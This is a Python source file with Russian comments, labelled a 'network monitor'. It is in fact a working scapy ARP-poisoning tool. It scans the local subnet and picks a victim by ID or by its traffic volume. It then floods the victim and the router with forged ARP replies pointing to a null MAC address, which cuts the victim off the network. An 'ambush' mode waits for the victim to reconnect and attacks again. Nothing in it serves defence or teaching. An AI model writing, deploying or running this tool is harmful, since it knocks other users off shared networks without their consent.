import scapy.all as scapy
import os
import socket
import sys
import time
import ctypes
from threading import Thread
from collections import Counter
from scapy.layers.l2 import ARP, Ether
from scapy.layers.inet import IP
from scapy.sendrecv import srp, sendp, sniff
from scapy.arch import get_if_addr
from scapy.all import conf


class NetworkTool:
    def __init__(self):
        self.my_ip = get_if_addr(conf.iface)
        self.router_ip = self._get_gateway_ip()
        self.router_mac = self._get_mac(self.router_ip)
        self.network_range = ".".join(self.my_ip.split(".")[:-1]) + ".0/24"
        self.is_attacking = False
        self.target_info = {"ip": None, "mac": None, "name": None, "packets": 0}
        self.found_devices = []

    def _get_gateway_ip(self):
        if os.name == 'nt':
            import subprocess
            result = subprocess.run(['route', 'print', '0.0.0.0'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if '0.0.0.0' in line and 'mask' not in line.lower():
                    parts = line.split()
                    if len(parts) >= 3 and parts[2] != "On-link": return parts[2]
        return "192.168.0.1"

    def _get_mac(self, ip):
        if not ip: return None
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=2, verbose=0)[0]
        return ans[0][1].hwsrc if ans else None

    def update_devices(self):
        # Глубокое сканирование с повторами
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.network_range), timeout=3, retry=2, verbose=0)[0]
        devs = []
        for _, r in ans:
            if r.psrc != self.my_ip and r.psrc != self.router_ip:
                try:
                    name = socket.gethostbyaddr(r.psrc)[0]
                except:
                    name = "Unknown Device"
                devs.append({'ip': r.psrc, 'mac': r.hwsrc, 'name': name})
        self.found_devices = devs

    def find_noisy_guy(self, duration=7):
        counts = Counter()

        def count_packets(pkt):
            if pkt.haslayer(IP):
                src = pkt[IP].src
                if src not in [self.my_ip, self.router_ip]: counts[src] += 1

        sniff(prn=count_packets, timeout=duration)
        return counts.most_common(1)[0][0] if counts else None

    def attack_process(self):
        print(f"[*] СТАТУС: Режим 'Мертвая хватка' активирован для {self.target_info['ip']}")

        # Подготовка пакетов
        # Пакет для цели (персональный)
        to_v = Ether(dst=self.target_info['mac']) / ARP(op=2, pdst=self.target_info['ip'],
                                                        hwdst=self.target_info['mac'], psrc=self.router_ip,
                                                        hwsrc="00:00:00:00:00:00")
        # Пакет для роутера (персональный)
        to_r = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip, hwdst=self.router_mac,
                                                psrc=self.target_info['ip'], hwsrc="00:00:00:00:00:00")
        # Широковещательный пакет (на случай если он сменил MAC или только зашел)
        broadcast_poison = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=self.target_info['ip'], psrc=self.router_ip,
                                                                hwsrc="00:00:00:00:00:00")

        while self.is_attacking:
            try:
                # 1. Основная атака
                sendp(to_v, verbose=False)
                sendp(to_r, verbose=False)

                # 2. Каждые 10 пакетов кидаем широковещательный, чтобы "застолбить" место в сети
                if self.target_info['packets'] % 20 == 0:
                    sendp(broadcast_poison, verbose=False)

                self.target_info['packets'] += 2

                # 3. ПРОВЕРКА: Если цель сбросила Wi-Fi, пингуем её
                if self.target_info['packets'] % 100 == 0:
                    # Быстрый ARP-запрос: "Ты тут?"
                    check = \
                    srp(Ether(dst=self.target_info['mac']) / ARP(pdst=self.target_info['ip']), timeout=0.2, verbose=0)[
                        0]
                    if not check:
                        print(f"\n[!] Цель {self.target_info['ip']} сорвалась! Ухожу в режим ЗАСАДЫ...")
                        self._wait_for_target()  # Ждем пока появится

                time.sleep(0.05)  # Повышенная агрессия (быстрее в 2 раза)
            except:
                continue

    def _wait_for_target(self):
        """Режим засады: сканирует сеть пока цель не появится снова"""
        while self.is_attacking:
            # Ищем конкретный IP или MAC в сети
            ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.target_info['ip']), timeout=1, verbose=0)[0]
            if ans:
                new_mac = ans[0][1].hwsrc
                print(f"[+] ЦЕЛЬ ВЕРНУЛАСЬ! MAC: {new_mac}")
                self.target_info['mac'] = new_mac
                return  # Возвращаемся в attack_process
            time.sleep(1)


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def main():
    tool = NetworkTool()
    tool.update_devices()  # Первоначальный поиск

    while True:
        clear_screen()
        print(f"--- [ NETWORK MONITOR v2.1 ] ---")
        print(f"IP: {tool.my_ip} | GW: {tool.router_ip} ({tool.router_mac})")
        print("-" * 55)

        if tool.is_attacking:
            print(f"● СТАТУС: АТАКА АКТИВНА")
            print(f"ЦЕЛЬ: {tool.target_info['ip']} | {tool.target_info['name']}")
            print(f"ПАКЕТОВ: {tool.target_info['packets']}")
        else:
            print(f"○ СТАТУС: ОЖИДАНИЕ")

        print("-" * 55)
        print("ID | IP АДРЕС       | MAC АДРЕС         | ИМЯ")
        for i, d in enumerate(tool.found_devices):
            print(f"{i:2} | {d['ip'].ljust(14)} | {d['mac']} | {d['name']}")

        print("-" * 55)
        print("1. Обновить список | 2. Атака по ID | 3. По шуму | 4. СТОП | 5. Выход")

        cmd = input(">> ")

        if cmd == '1':
            print("[*] Сканирую...")
            tool.update_devices()
        elif cmd == '2':
            try:
                idx = int(input("Введите ID: "))
                target = tool.found_devices[idx]
                tool.target_info.update(
                    {"ip": target['ip'], "mac": target['mac'], "name": target['name'], "packets": 0})
                tool.is_attacking = True
                Thread(target=tool.attack_process, daemon=True).start()
            except:
                pass
        elif cmd == '3':
            print("[*] Слушаю сеть на предмет шума...")
            noisy_ip = tool.find_noisy_guy()
            if noisy_ip:
                mac = tool._get_mac(noisy_ip)
                if mac:
                    tool.target_info.update({"ip": noisy_ip, "mac": mac, "name": "Noisy Guy", "packets": 0})
                    tool.is_attacking = True
                    Thread(target=tool.attack_process, daemon=True).start()
        elif cmd == '4':
            tool.is_attacking = False
            print("[*] Остановка...")
            time.sleep(1)
        elif cmd == '5':
            tool.is_attacking = False
            break


if __name__ == "__main__":
    if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
        print("ЗАПУСТИТЕ ОТ ИМЕНИ АДМИНИСТРАТОРА!")
        sys.exit()
    main()